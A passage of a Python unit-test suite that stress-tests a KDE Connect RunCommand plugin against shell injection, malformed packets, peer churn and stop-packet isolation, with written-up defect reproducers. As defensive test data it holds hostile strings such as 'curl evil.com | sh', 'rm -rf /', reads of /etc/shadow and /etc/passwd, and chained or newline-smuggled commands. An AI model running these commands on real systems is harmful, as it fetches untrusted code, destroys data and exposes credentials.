"""tests.unit.test_challenger_m23_runcommand_protocol
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Adversarial Stress & Fuzzing Suite — Challenger 2 (Milestone 23: RunCommand Protocol & Security).

Empirical verification targeting PenguLink's KDE Connect RunCommand host plugin
(`pengulink.plugins.runcommand.RunCommandPlugin`) and underlying command service:

1. RCE & Shell Injection Attacks:
   - Remote command payloads in 'command' and 'cmd' keys are ignored with zero execution.
   - Shell metacharacters in key (';', '&&', '||', '|', '`', '$()', '>', newline).
   - Strict dictionary lookup prevents arbitrary path traversal or non-configured execution.
   - Arguments in locally configured commands are executed directly without shell expansion.
   - Mixed payloads containing valid key + malicious remote command strings execute ONLY local command.

2. Malformed Packets & Input Fuzzing:
   - Missing body and None body handled cleanly.
   - Empty body dictionary {} handled cleanly.
   - Null key ({"key": None}) handled cleanly without exception.
   - Integer and numeric keys (42, 0, -1, 3.14) rejected safely.
   - Boolean and collection keys (True, False, [1, 2], {"k": "v"}) rejected safely.
   - Huge string keys (100 KB payload) rejected without memory exhaustion or crash.
   - Unicode surrogates, null bytes, and control characters in key handled cleanly.
   - Superfluous payload fields ignored safely.
   - Randomized fuzz generator (50 pseudo-random payloads).

3. Concurrency, Multi-Peer Churn & Lifecycle:
   - High-concurrency execution from 5 simultaneous peers.
   - Peer disconnection during active command streaming completes safely without leaks.
   - Peer unpairing during command execution terminates active process groups.
   - Rapid connect/disconnect cycles clean up peer tracking.
   - Clean plugin start/stop cycles with zero task leaks.

4. Stop Packet Edge Cases & Process Teardown:
   - Stop packet when no processes are running is safe no-op.
   - Repeated stop packets are safe no-ops.
   - Stop packet terminates all processes initiated by the requesting device.

5. CommandList Wire Encoding (Android Requirement):
   - commandList in broadcast is strictly a valid JSON string (np.getString).
   - Empty store produces valid stringified JSON "{}" (not native dict).
   - Unicode, emoji, quotes, and backslashes in command names/commands serialize and roundtrip.
   - Disabled commands are strictly excluded from wire advertisement.
   - canAddCommand is explicitly True.

6. Empirical Defect Reproducers (Challenger Findings):
   - Defect 1: Unhandled AttributeError when packet body is not a dict.
   - Defect 2: Unpaired peer registered in _connected_peers leaking commandList via broadcast.
   - Defect 3: Cross-device process termination on stop packet (lack of peer isolation).
   - Defect 4: Race condition between command start and stop packet leaving unmonitored process running.
"""

from __future__ import annotations

import asyncio
import json
import random
import sys
from pathlib import Path
from typing import Any

from pengulink.core.events import (
    DeviceConnected,
    DeviceDisconnected,
    DeviceUnpaired,
    EventBus,
)
from pengulink.network.packet import Packet
from pengulink.plugins.runcommand import (
    REMOTE_FORCE_COMMAND_TYPE,
    RUNCOMMAND_OUTPUT_TYPE,
    RUNCOMMAND_PACKET_TYPE,
    RUNCOMMAND_REQUEST_TYPE,
    RunCommandPlugin,
)
from pengulink.services.command import (
    CommandStore,
    LocalCommandService,
)


def _make_req(
    body: dict[str, Any] | None = None, ptype: str = RUNCOMMAND_REQUEST_TYPE
) -> Packet:
    return Packet(type=ptype, body=body or {})


# =============================================================================
# 1. RCE & Shell Injection Attacks
# =============================================================================


class TestRunCommandRCEAndInjectionAttacks:
    """Stress tests verifying strict immunity against Remote Code Execution & Injection."""

    async def test_remote_command_payload_ignored_zero_execution(
        self, tmp_path: Path
    ) -> None:
        """Remote 'command' field payload is unconditionally ignored; zero processes spawned."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        service = LocalCommandService(command_store=store)
        plugin = RunCommandPlugin(command_store=store, command_service=service)

        sent: list[Packet] = []
        pkt = _make_req(body={"command": "curl evil.com | sh"})
        await plugin.handle_packet(pkt, "peer_1", sent.append)

        await asyncio.sleep(0.1)
        assert len(sent) == 0
        assert len(service._active_processes) == 0

    async def test_remote_cmd_payload_ignored_zero_execution(
        self, tmp_path: Path
    ) -> None:
        """Remote 'cmd' alias payload is unconditionally ignored; zero processes spawned."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        service = LocalCommandService(command_store=store)
        plugin = RunCommandPlugin(command_store=store, command_service=service)

        sent: list[Packet] = []
        pkt = _make_req(body={"cmd": "rm -rf / --no-preserve-root"})
        await plugin.handle_packet(pkt, "peer_1", sent.append)

        await asyncio.sleep(0.1)
        assert len(sent) == 0
        assert len(service._active_processes) == 0

    async def test_semicolon_command_injection_in_key_rejected(
        self, tmp_path: Path
    ) -> None:
        """Semicolon command chaining in key fails dictionary lookup; zero execution."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        store.add_command(name="Lock", command="loginctl lock-session", key="cmd_lock")
        service = LocalCommandService(command_store=store)
        plugin = RunCommandPlugin(command_store=store, command_service=service)

        sent: list[Packet] = []
        pkt = _make_req(body={"key": "; reboot ;"})
        await plugin.handle_packet(pkt, "peer_1", sent.append)

        await asyncio.sleep(0.1)
        assert len(sent) == 0
        assert len(service._active_processes) == 0

    async def test_chained_and_pipe_injection_in_key_rejected(
        self, tmp_path: Path
    ) -> None:
        """Shell operators (&&, ||, |) in key fail dictionary lookup."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        store.add_command(name="Lock", command="loginctl lock-session", key="cmd_lock")
        service = LocalCommandService(command_store=store)
        plugin = RunCommandPlugin(command_store=store, command_service=service)

        sent: list[Packet] = []
        injections = [
            "cmd_lock && id",
            "cmd_lock || whoami",
            "cmd_lock | cat /etc/passwd",
        ]
        for inj in injections:
            pkt = _make_req(body={"key": inj})
            await plugin.handle_packet(pkt, "peer_1", sent.append)

        await asyncio.sleep(0.1)
        assert len(sent) == 0
        assert len(service._active_processes) == 0

    async def test_command_substitution_backticks_and_dollar_rejected(
        self, tmp_path: Path
    ) -> None:
        """Command substitution syntax (`cmd`, $(cmd)) in key rejected safely."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        service = LocalCommandService(command_store=store)
        plugin = RunCommandPlugin(command_store=store, command_service=service)

        sent: list[Packet] = []
        injections = [
            "`whoami`",
            "$(id)",
            "${PATH}",
            "$(cat /etc/shadow)",
        ]
        for inj in injections:
            pkt = _make_req(body={"key": inj})
            await plugin.handle_packet(pkt, "peer_1", sent.append)

        await asyncio.sleep(0.1)
        assert len(sent) == 0
        assert len(service._active_processes) == 0

    async def test_shell_redirect_and_newline_in_key_rejected(
        self, tmp_path: Path
    ) -> None:
        """Redirections and newline separators in key fail dictionary lookup."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        service = LocalCommandService(command_store=store)
        plugin = RunCommandPlugin(command_store=store, command_service=service)

        sent: list[Packet] = []
        injections = [
            "cmd_lock > /tmp/pwned",
            "cmd_lock >> /tmp/pwned",
            "cmd_lock < /dev/zero",
            "cmd_lock\nreboot",
            "cmd_lock\r\nrm -rf /",
        ]
        for inj in injections:
            pkt = _make_req(body={"key": inj})
            await plugin.handle_packet(pkt, "peer_1", sent.append)

        await asyncio.sleep(0.1)
        assert len(sent) == 0
        assert len(service._active_processes) == 0

    async def test_path_traversal_in_key_rejected(self, tmp_path: Path) -> None:
        """Path traversal patterns in key fail dictionary lookup."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        service = LocalCommandService(command_store=store)
        plugin = RunCommandPlugin(command_store=store, command_service=service)

        sent: list[Packet] = []
        traversals = [
            "../../../../bin/sh",
            "../../etc/passwd",
            "/bin/bash",
            "/usr/bin/python3",
        ]
        for path in traversals:
            pkt = _make_req(body={"key": path})
            await plugin.handle_packet(pkt, "peer_1", sent.append)

        await asyncio.sleep(0.1)
        assert len(sent) == 0
        assert len(service._active_processes) == 0

    async def test_direct_execution_does_not_evaluate_shell_syntax_in_arguments(
        self, tmp_path: Path
    ) -> None:
        """Locally configured arguments containing metacharacters are passed literally (no shell)."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        # Echo literal string containing shell syntax
        store.add_command(
            name="Echo Test",
            command=f"{sys.executable} -c 'import sys; print(sys.argv[1])' 'foo; echo pwned'",
            key="cmd_echo_literal",
        )
        service = LocalCommandService(command_store=store)
        plugin = RunCommandPlugin(command_store=store, command_service=service)

        sent: list[Packet] = []
        pkt = _make_req(body={"key": "cmd_echo_literal"})
        await plugin.handle_packet(pkt, "peer_1", sent.append)

        await asyncio.sleep(0.3)
        finished = [p for p in sent if p.body.get("commandFinished")]
        assert len(finished) == 1
        assert finished[0].body["success"] is True
        # Output should be literal "foo; echo pwned", not evaluated as a second command
        assert finished[0].body["output"] == "foo; echo pwned"

    async def test_key_with_remote_command_payload_executes_only_local_command(
        self, tmp_path: Path
    ) -> None:
        """When both key and command are sent, only the locally configured command runs."""
        marker_file = tmp_path / "should_never_exist.txt"
        store = CommandStore(storage_path=tmp_path / "commands.json")
        store.add_command(
            name="Safe Echo",
            command=f"{sys.executable} -c 'print(\"legit_output\")'",
            key="cmd_safe",
        )
        service = LocalCommandService(command_store=store)
        plugin = RunCommandPlugin(command_store=store, command_service=service)

        sent: list[Packet] = []
        malicious_cmd = f"{sys.executable} -c 'import pathlib; pathlib.Path(\"{marker_file}\").touch()'"
        pkt = _make_req(
            body={
                "key": "cmd_safe",
                "command": malicious_cmd,
                "cmd": malicious_cmd,
            }
        )
        await plugin.handle_packet(pkt, "peer_1", sent.append)

        await asyncio.sleep(0.3)
        assert not marker_file.exists(), "Remote command payload was executed!"
        finished = [p for p in sent if p.body.get("commandFinished")]
        assert len(finished) == 1
        assert "legit_output" in finished[0].body["output"]

    async def test_remote_force_command_type_supported(self, tmp_path: Path) -> None:
        """kdeconnect.remoteforcecommand packet type is supported and executes configured key."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        store.add_command(
            name="Force Echo",
            command=f"{sys.executable} -c 'print(\"force_output\")'",
            key="cmd_force",
        )
        service = LocalCommandService(command_store=store)
        plugin = RunCommandPlugin(command_store=store, command_service=service)

        sent: list[Packet] = []
        pkt = _make_req(body={"key": "cmd_force"}, ptype=REMOTE_FORCE_COMMAND_TYPE)
        await plugin.handle_packet(pkt, "peer_force", sent.append)

        await asyncio.sleep(0.3)
        finished = [
            p
            for p in sent
            if p.type == RUNCOMMAND_OUTPUT_TYPE and p.body.get("commandFinished")
        ]
        assert len(finished) == 1
        assert finished[0].body["success"] is True
        assert "force_output" in finished[0].body["output"]


# =============================================================================
# 2. Malformed Packets & Input Fuzzing
# =============================================================================


class TestRunCommandMalformedPackets:
    """Fuzzing tests validating robust non-crashing handling of malformed inputs."""

    async def test_missing_body_none_handled_cleanly(self, tmp_path: Path) -> None:
        """Packet with body=None handled safely as no-op."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        plugin = RunCommandPlugin(command_store=store)

        sent: list[Packet] = []
        pkt = Packet.model_construct(type=RUNCOMMAND_REQUEST_TYPE, body=None)
        await plugin.handle_packet(pkt, "peer_1", sent.append)
        assert len(sent) == 0

    async def test_empty_body_dict_handled_cleanly(self, tmp_path: Path) -> None:
        """Packet with empty body {} handled safely as no-op."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        plugin = RunCommandPlugin(command_store=store)

        sent: list[Packet] = []
        pkt = _make_req(body={})
        await plugin.handle_packet(pkt, "peer_1", sent.append)
        assert len(sent) == 0

    async def test_null_key_in_body_handled_cleanly(self, tmp_path: Path) -> None:
        """Packet containing {"key": None} handled safely without exception."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        plugin = RunCommandPlugin(command_store=store)

        sent: list[Packet] = []
        pkt = _make_req(body={"key": None})
        await plugin.handle_packet(pkt, "peer_1", sent.append)
        assert len(sent) == 0

    async def test_integer_and_numeric_keys_rejected_without_crash(
        self, tmp_path: Path
    ) -> None:
        """Numeric keys (int, float) converted safely and rejected when not in store."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        plugin = RunCommandPlugin(command_store=store)

        sent: list[Packet] = []
        for bad_key in (0, 42, -1, 10**18, 3.14159):
            pkt = _make_req(body={"key": bad_key})
            await plugin.handle_packet(pkt, "peer_1", sent.append)

        assert len(sent) == 0

    async def test_boolean_and_collection_keys_rejected_without_crash(
        self, tmp_path: Path
    ) -> None:
        """Boolean and collection keys (lists, dicts) rejected without unhandled crash."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        plugin = RunCommandPlugin(command_store=store)

        sent: list[Packet] = []
        for bad_key in (True, False, [1, 2], {"nested": "dict"}, ()):
            pkt = _make_req(body={"key": bad_key})
            await plugin.handle_packet(pkt, "peer_1", sent.append)

        assert len(sent) == 0

    async def test_huge_100kb_string_key_rejected_without_crash(
        self, tmp_path: Path
    ) -> None:
        """Huge string key (100 KB) rejected safely without memory exhaustion."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        plugin = RunCommandPlugin(command_store=store)

        sent: list[Packet] = []
        huge_key = "A" * (100 * 1024)
        pkt = _make_req(body={"key": huge_key})
        await plugin.handle_packet(pkt, "peer_1", sent.append)
        assert len(sent) == 0

    async def test_unicode_surrogates_and_control_chars_in_key_handled_cleanly(
        self, tmp_path: Path
    ) -> None:
        """Unicode surrogates and null bytes in key handled safely."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        plugin = RunCommandPlugin(command_store=store)

        sent: list[Packet] = []
        bad_keys = [
            "\x00\x01\x02\n\r\t",
            "\ud800\udc00",
            "cmd_lock\x00_hidden",
            "   \t\n   ",
            "🔒🔑💻",
        ]
        for key in bad_keys:
            pkt = _make_req(body={"key": key})
            await plugin.handle_packet(pkt, "peer_1", sent.append)

        assert len(sent) == 0

    async def test_unexpected_extra_keys_in_payload_ignored(
        self, tmp_path: Path
    ) -> None:
        """Superfluous keys in execution payload are ignored while valid key executes."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        store.add_command(
            name="Date",
            command=f"{sys.executable} -c 'print(\"time_ok\")'",
            key="cmd_date",
        )
        service = LocalCommandService(command_store=store)
        plugin = RunCommandPlugin(command_store=store, command_service=service)

        sent: list[Packet] = []
        pkt = _make_req(
            body={
                "key": "cmd_date",
                "junk_buffer": "B" * 10000,
                "extra_int": 999,
                "extra_list": ["a", "b"],
                "nested_dict": {"x": 1},
            }
        )
        await plugin.handle_packet(pkt, "peer_1", sent.append)

        await asyncio.sleep(0.3)
        finished = [p for p in sent if p.body.get("commandFinished")]
        assert len(finished) == 1
        assert "time_ok" in finished[0].body["output"]

    async def test_fuzz_randomized_payloads(self, tmp_path: Path) -> None:
        """50 pseudo-random payloads pass without unhandled exception."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        plugin = RunCommandPlugin(command_store=store)

        rng = random.Random(1337)
        keys_pool = [
            None,
            "",
            "   ",
            123,
            -1,
            3.14,
            True,
            False,
            [],
            [1, "a"],
            {},
            {"a": 1},
            "cmd_missing",
            "a" * 1000,
            "; rm -rf / ;",
            "\x00",
        ]

        sent: list[Packet] = []
        for _ in range(50):
            body: dict[str, Any] = {}
            if rng.random() > 0.3:
                body["key"] = rng.choice(keys_pool)
            if rng.random() > 0.5:
                body["stop"] = rng.choice([True, False, None, "true", 1])
            if rng.random() > 0.5:
                body["requestCommandList"] = rng.choice([True, False, None])
            if rng.random() > 0.7:
                body["command"] = "malicious_payload"

            pkt = _make_req(body=body)
            await plugin.handle_packet(pkt, "peer_fuzz", sent.append)


# =============================================================================
# 3. Concurrency, Multi-Peer Churn & Lifecycle
# =============================================================================


class TestRunCommandConcurrencyAndPeerChurn:
    """Stress tests verifying concurrency safety, multi-peer isolation, and clean lifecycle."""

    async def test_multiple_peers_concurrent_execution(self, tmp_path: Path) -> None:
        """5 concurrent peers execute commands simultaneously; each receives correlated outputs."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        store.add_command(
            name="Concurrent Echo",
            command=f"{sys.executable} -c 'import time; time.sleep(0.05); print(\"done\")'",
            key="cmd_concurrent",
        )
        service = LocalCommandService(command_store=store)
        plugin = RunCommandPlugin(command_store=store, command_service=service)

        num_peers = 5
        peer_results: dict[str, list[Packet]] = {
            f"peer_{i}": [] for i in range(num_peers)
        }

        async def run_peer(peer_id: str) -> None:
            pkt = _make_req(body={"key": "cmd_concurrent"})
            await plugin.handle_packet(
                pkt, peer_id, lambda p: peer_results[peer_id].append(p)
            )

        # Dispatch 5 peers concurrently
        await asyncio.gather(*[run_peer(f"peer_{i}") for i in range(num_peers)])

        # Await completion
        await asyncio.sleep(0.5)

        for peer_id, packets in peer_results.items():
            started = [p for p in packets if p.body.get("commandStarted")]
            finished = [p for p in packets if p.body.get("commandFinished")]
            assert len(started) == 1, f"Peer {peer_id} missing commandStarted"
            assert len(finished) == 1, f"Peer {peer_id} missing commandFinished"
            assert finished[0].body["success"] is True
            assert finished[0].body["key"] == "cmd_concurrent"
            # Ensure process IDs are distinct
            assert started[0].body["id"] == finished[0].body["id"]

    async def test_peer_disconnect_during_command_execution_completes_safely(
        self, tmp_path: Path
    ) -> None:
        """Peer disconnect while command runs completes safely without crashing or leaking."""
        bus = EventBus()
        store = CommandStore(storage_path=tmp_path / "commands.json")
        store.add_command(
            name="Delayed Echo",
            command=f"{sys.executable} -c 'import time; time.sleep(0.2); print(\"late_output\")'",
            key="cmd_delayed",
        )
        service = LocalCommandService(command_store=store)
        plugin = RunCommandPlugin(
            event_bus=bus, command_store=store, command_service=service
        )
        await plugin.start()

        sent: list[Packet] = []

        async def failing_sender(pkt: Packet) -> None:
            if pkt.body.get("commandFinished"):
                raise ConnectionResetError("Peer socket disconnected abruptly")
            sent.append(pkt)

        pkt = _make_req(body={"key": "cmd_delayed"})
        await plugin.handle_packet(pkt, "peer_flaky", failing_sender)

        # Peer disconnects while command is in flight
        await bus.publish(DeviceDisconnected(device_id="peer_flaky", reason="drop"))

        # Wait for command execution to complete and background task to finish
        await asyncio.sleep(0.4)

        assert "peer_flaky" not in plugin._connected_peers
        assert len(service._active_processes) == 0
        await plugin.stop()

    async def test_peer_unpair_during_command_execution_terminates_process(
        self, tmp_path: Path
    ) -> None:
        """Device unpairing immediately terminates running processes initiated by that device."""
        bus = EventBus()
        store = CommandStore(storage_path=tmp_path / "commands.json")
        store.add_command(
            name="Long Sleep",
            command=f"{sys.executable} -c 'import time; time.sleep(30)'",
            key="cmd_long_sleep",
        )
        service = LocalCommandService(command_store=store)
        plugin = RunCommandPlugin(
            event_bus=bus, command_store=store, command_service=service
        )
        await plugin.start()

        pkt = _make_req(body={"key": "cmd_long_sleep"})
        await plugin.handle_packet(pkt, "peer_to_unpair", lambda p: None)

        await asyncio.sleep(0.15)
        assert len(service._active_processes) >= 1

        # Unpair the device
        await bus.publish(DeviceUnpaired(device_id="peer_to_unpair"))
        await asyncio.sleep(0.2)

        assert len(service._active_processes) == 0
        await plugin.stop()

    async def test_rapid_connect_disconnect_peer_tracking(self, tmp_path: Path) -> None:
        """50 rapid connect / disconnect events cleanly update peer registry without leaks."""
        bus = EventBus()
        store = CommandStore(storage_path=tmp_path / "commands.json")
        plugin = RunCommandPlugin(event_bus=bus, command_store=store)
        await plugin.start()

        for i in range(50):
            dev_id = f"peer_churn_{i}"
            plugin._connected_peers[dev_id] = lambda p: None
            await bus.publish(DeviceDisconnected(device_id=dev_id, reason="test"))
            assert dev_id not in plugin._connected_peers

        assert len(plugin._connected_peers) == 0
        await plugin.stop()

    async def test_device_connected_lifecycle_broadcast(self, tmp_path: Path) -> None:
        """DeviceConnected event causes automatic transmission of commandList to that device."""
        bus = EventBus()
        store = CommandStore(storage_path=tmp_path / "commands.json")
        store.add_command(name="Lock", command="loginctl lock", key="cmd_lock")
        plugin = RunCommandPlugin(event_bus=bus, command_store=store)
        await plugin.start()

        sent: list[Packet] = []
        plugin._connected_peers["peer_connect"] = sent.append

        await bus.publish(
            DeviceConnected(device_id="peer_connect", device_name="Test Peer")
        )
        assert len(sent) == 1
        assert sent[0].type == RUNCOMMAND_PACKET_TYPE
        await plugin.stop()

    async def test_clean_plugin_stop_terminates_processes_and_tasks(
        self, tmp_path: Path
    ) -> None:
        """Stopping plugin terminates all active processes and gathers background tasks cleanly."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        store.add_command(
            name="Sleep 10",
            command=f"{sys.executable} -c 'import time; time.sleep(10)'",
            key="cmd_sleep_10",
        )
        service = LocalCommandService(command_store=store)
        plugin = RunCommandPlugin(command_store=store, command_service=service)
        await plugin.start()

        # Launch 5 concurrent commands
        for i in range(5):
            pkt = _make_req(body={"key": "cmd_sleep_10"})
            await plugin.handle_packet(pkt, f"peer_{i}", lambda p: None)

        await asyncio.sleep(0.15)
        assert len(service._active_processes) == 5

        await plugin.stop()
        await asyncio.sleep(0.1)

        assert len(service._active_processes) == 0
        assert len(plugin._bg_tasks) == 0
        assert len(plugin._connected_peers) == 0


# =============================================================================
# 4. Stop Packet Edge Cases & Process Teardown
# =============================================================================


class TestRunCommandStopPacketEdgeCases:
    """Stress tests evaluating stop packet robustness and edge cases."""

    async def test_stop_when_no_processes_running_is_safe_noop(
        self, tmp_path: Path
    ) -> None:
        """Stop packet when zero processes are running is a clean safe no-op."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        service = LocalCommandService(command_store=store)
        plugin = RunCommandPlugin(command_store=store, command_service=service)

        sent: list[Packet] = []
        pkt = _make_req(body={"stop": True})
        await plugin.handle_packet(pkt, "peer_1", sent.append)

        assert len(sent) == 0
        assert len(service._active_processes) == 0

    async def test_repeated_stop_packets_safe_noop(self, tmp_path: Path) -> None:
        """Sending 10 rapid stop packets does not cause exceptions or crashes."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        service = LocalCommandService(command_store=store)
        plugin = RunCommandPlugin(command_store=store, command_service=service)

        sent: list[Packet] = []
        pkt = _make_req(body={"stop": True})
        for _ in range(10):
            await plugin.handle_packet(pkt, "peer_1", sent.append)

        assert len(sent) == 0
        assert len(service._active_processes) == 0

    async def test_stop_terminates_all_processes_for_target_device(
        self, tmp_path: Path
    ) -> None:
        """Stop packet terminates multiple processes initiated by the same device."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        store.add_command(
            name="Sleep 20",
            command=f"{sys.executable} -c 'import time; time.sleep(20)'",
            key="cmd_sleep_20",
        )
        service = LocalCommandService(command_store=store)
        plugin = RunCommandPlugin(command_store=store, command_service=service)

        # Launch 3 processes from the same peer
        for _ in range(3):
            pkt = _make_req(body={"key": "cmd_sleep_20"})
            await plugin.handle_packet(pkt, "peer_multi_stop", lambda p: None)

        await asyncio.sleep(0.2)
        assert len(service._active_processes) == 3

        # Send stop packet
        stop_pkt = _make_req(body={"stop": True})
        await plugin.handle_packet(stop_pkt, "peer_multi_stop", lambda p: None)

        await asyncio.sleep(0.3)
        assert len(service._active_processes) == 0
        await plugin.stop()


# =============================================================================
# 5. CommandList Wire Encoding (Android Spec Invariant)
# =============================================================================


class TestRunCommandListEncoding:
    """Tests verifying strict adherence to Android stringified JSON wire requirements."""

    async def test_command_list_broadcast_is_strictly_valid_json_string(
        self, tmp_path: Path
    ) -> None:
        """Outbound kdeconnect.runcommand must have body.commandList as a compact JSON string."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        store.add_command(
            name="Lock Screen", command="loginctl lock-session", key="cmd_lock"
        )
        store.add_command(
            name="Suspend", command="systemctl suspend", key="cmd_suspend"
        )
        plugin = RunCommandPlugin(command_store=store)

        sent: list[Packet] = []
        plugin._connected_peers["peer_android"] = sent.append

        await plugin.broadcast_command_list()

        assert len(sent) == 1
        pkt = sent[0]
        assert pkt.type == RUNCOMMAND_PACKET_TYPE
        assert pkt.body.get("canAddCommand") is True

        # Android requirement: np.getString("commandList")
        raw_cmd_list = pkt.body.get("commandList")
        assert isinstance(raw_cmd_list, str), (
            "commandList must be a stringified JSON string, NOT a dict!"
        )

        parsed = json.loads(raw_cmd_list)
        assert isinstance(parsed, dict)
        assert "cmd_lock" in parsed
        assert parsed["cmd_lock"]["name"] == "Lock Screen"
        assert parsed["cmd_lock"]["command"] == "loginctl lock-session"
        assert "cmd_suspend" in parsed
        assert parsed["cmd_suspend"]["name"] == "Suspend"
        assert parsed["cmd_suspend"]["command"] == "systemctl suspend"

    async def test_empty_store_produces_empty_json_object_string(
        self, tmp_path: Path
    ) -> None:
        """When no commands configured, commandList is the string '{}'."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        plugin = RunCommandPlugin(command_store=store)

        pkt = plugin._create_command_list_packet()
        raw_list = pkt.body["commandList"]
        assert isinstance(raw_list, str)
        assert raw_list == "{}"
        assert json.loads(raw_list) == {}

    async def test_unicode_and_special_characters_in_command_list(
        self, tmp_path: Path
    ) -> None:
        """Unicode characters, quotes, and backslashes roundtrip cleanly in commandList string."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        store.add_command(
            name="锁定屏幕 🔒",
            command="python3 -c 'print(\"test\")'",
            key="cmd_unicode_1",
        )
        store.add_command(
            name='Escape "Quotes" & \\Backslashes\\',
            command='echo "hello world"',
            key="cmd_quotes",
        )
        plugin = RunCommandPlugin(command_store=store)

        pkt = plugin._create_command_list_packet()
        parsed = json.loads(pkt.body["commandList"])

        assert parsed["cmd_unicode_1"]["name"] == "锁定屏幕 🔒"
        assert parsed["cmd_quotes"]["name"] == 'Escape "Quotes" & \\Backslashes\\'
        assert parsed["cmd_quotes"]["command"] == 'echo "hello world"'

    async def test_disabled_commands_excluded_from_command_list_string(
        self, tmp_path: Path
    ) -> None:
        """Disabled commands are omitted from outbound wire commandList."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        store.add_command(
            name="Active", command="echo 1", key="cmd_active", enabled=True
        )
        store.add_command(
            name="Disabled", command="echo 2", key="cmd_disabled", enabled=False
        )
        plugin = RunCommandPlugin(command_store=store)

        pkt = plugin._create_command_list_packet()
        parsed = json.loads(pkt.body["commandList"])

        assert "cmd_active" in parsed
        assert "cmd_disabled" not in parsed

    async def test_can_add_command_flag_is_true(self, tmp_path: Path) -> None:
        """canAddCommand flag is set to True per KDE Connect desktop host spec."""
        store = CommandStore(storage_path=tmp_path / "commands.json")
        plugin = RunCommandPlugin(command_store=store)

        pkt = plugin._create_command_list_packet()
        assert pkt.body.get("canAddCommand") is True


# =============================================================================
# 6. Empirical Defect Reproducers (Challenger Findings)
# =============================================================================


class TestRunCommandEmpiricalDefectReproducers:
    """Empirical proof-of-defect tests demonstrating concrete failure modes under challenge."""

    async def test_defect_non_dict_body_attribute_error(self, tmp_path: Path) -> None:
        """Defect 1: Unhandled AttributeError when packet body is not a dict.

        Location: pengulink/plugins/runcommand.py:284-287.
        When a packet arrives with a non-dict body (e.g. str, list),
        body = packet.body or {} sets body to that object, and body.get(...)
        raises AttributeError: 'str' object has no attribute 'get'.
        Remediation: Guard with `if not isinstance(body, dict): return`.
        """
        store = CommandStore(storage_path=tmp_path / "commands.json")
        plugin = RunCommandPlugin(command_store=store)

        sent: list[Packet] = []
        for non_dict_body in ("malformed_string_payload", [1, 2, 3], 42):
            pkt = Packet.model_construct(
                type=RUNCOMMAND_REQUEST_TYPE, body=non_dict_body
            )
            # MUST handle safely without raising AttributeError
            await plugin.handle_packet(pkt, "peer_malformed", sent.append)

        assert len(sent) == 0

    async def test_defect_unpaired_device_broadcast_leak(self, tmp_path: Path) -> None:
        """Defect 2: Unpaired peer registered in _connected_peers leaking commandList.

        Location: pengulink/plugins/runcommand.py:258-278.
        self._connected_peers[device_id] = send_packet is executed BEFORE
        is_paired_checker(device_id) check. While the immediate packet is dropped,
        the unauthenticated device remains in _connected_peers and subsequently
        receives broadcast_command_list() packets containing all host commands.
        Remediation: Register peer in _connected_peers ONLY AFTER is_paired verification.
        """
        store = CommandStore(storage_path=tmp_path / "commands.json")
        store.add_command(
            name="Secret Command", command="cat /etc/hosts", key="cmd_secret"
        )
        plugin = RunCommandPlugin(
            command_store=store, is_paired_checker=lambda d: d == "paired_device"
        )

        untrusted_packets: list[Packet] = []
        req = _make_req(body={"requestCommandList": True})

        # Rogue unpaired device sends request
        await plugin.handle_packet(req, "untrusted_device", untrusted_packets.append)

        # Unpaired device must NOT be retained in _connected_peers
        assert "untrusted_device" not in plugin._connected_peers, (
            "SECURITY LEAK: Unpaired device was added to _connected_peers before pairing verification!"
        )

        # When host broadcasts commands, unauthenticated device must receive nothing
        await plugin.broadcast_command_list()
        assert len(untrusted_packets) == 0, (
            "SECURITY LEAK: Unpaired device received host commandList broadcast!"
        )

    async def test_defect_multi_peer_stop_isolation_breach(
        self, tmp_path: Path
    ) -> None:
        """Defect 3: Cross-device process termination on stop packet.

        Location: pengulink/plugins/runcommand.py:293-298.
        When body.get('stop') is processed, it calls self.command_service.stop_all(),
        terminating processes initiated by ALL peers rather than just the requesting device.
        Remediation: Only call self.stop_device_processes(device_id); do NOT call stop_all().
        """
        store = CommandStore(storage_path=tmp_path / "commands.json")
        store.add_command(
            name="Sleep A",
            command=f"{sys.executable} -c 'import time; time.sleep(5)'",
            key="cmd_sleep_a",
        )
        service = LocalCommandService(command_store=store)
        plugin = RunCommandPlugin(command_store=store, command_service=service)

        # Peer A starts a long-running process
        req_a = _make_req(body={"key": "cmd_sleep_a"})
        await plugin.handle_packet(req_a, "peer_A", lambda p: None)
        await asyncio.sleep(0.15)
        assert len(service._active_processes) >= 1, "Peer A process failed to start"

        # Peer B sends stop: True
        stop_b = _make_req(body={"stop": True})
        await plugin.handle_packet(stop_b, "peer_B", lambda p: None)
        await asyncio.sleep(0.15)

        # Peer A's process must NOT be terminated by Peer B's stop request
        active_count = len(service._active_processes)
        await plugin.stop()
        assert active_count == 1, (
            f"ISOLATION BREACH: Peer B's stop request killed Peer A's running process! (Active processes: {active_count})"
        )

    async def test_defect_concurrent_start_and_stop_race_condition(
        self, tmp_path: Path
    ) -> None:
        """Defect 4: Race condition between command start and stop packet leaving unmonitored process.

        Location: pengulink/plugins/runcommand.py:356-425.
        _execute_and_stream awaits safe_send_packet(start_pkt) before spawning the process.
        A concurrent stop packet runs during this yield, pops _device_running_processes,
